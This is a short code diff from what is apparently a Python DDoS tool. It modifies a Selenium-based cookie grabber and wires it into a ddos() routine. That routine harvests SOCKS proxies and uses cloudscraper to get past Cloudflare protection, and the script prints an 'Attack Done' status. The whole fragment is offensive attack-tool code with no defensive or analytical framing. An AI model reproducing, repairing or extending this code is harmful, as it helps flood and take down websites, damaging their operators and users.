@@ -50,7 +50,7 @@ def countdown(times):
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
 
-def get_cookie(url):
+def get_cookie():
     global useragent, cookieJAR, cookie
     options = webdriver.ChromeOptions()
     arguments = [
@@ -2502,6 +2502,7 @@ def Headerss(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
+    get_cookie()
     session = requests.Session()
     scraper = cloudscraper.create_scraper(sess=session)
     jar = RequestsCookieJar()
